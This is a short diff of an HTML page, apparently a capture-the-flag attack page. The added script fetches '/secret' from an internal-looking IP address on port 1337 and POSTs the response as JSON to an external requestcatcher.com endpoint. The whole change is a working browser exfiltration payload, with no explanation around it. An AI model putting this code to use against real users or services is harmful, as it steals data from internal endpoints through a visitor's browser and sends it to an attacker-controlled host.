@@ -9,9 +9,18 @@
     <body>
         <h1>HAHAHAHHA</h1>
         <script>
+            let xhrFlag = new XMLHttpRequest();
+            xhrFlag.open('GET', 'http://158.160.35.89:1337/secret', false)
+            xhrFlag.send();
+            
+            
             let xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://l.requestcatcher.com/test')
-            xhr.send();
+            xhr.open('POST', 'https://l.requestcatcher.com/test', false)
+            let json = JSON.stringify({
+              page: xhrFlag.responseText,
+            });
+            xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+            xhr.send(json);
         </script>
     </body>
 </html>
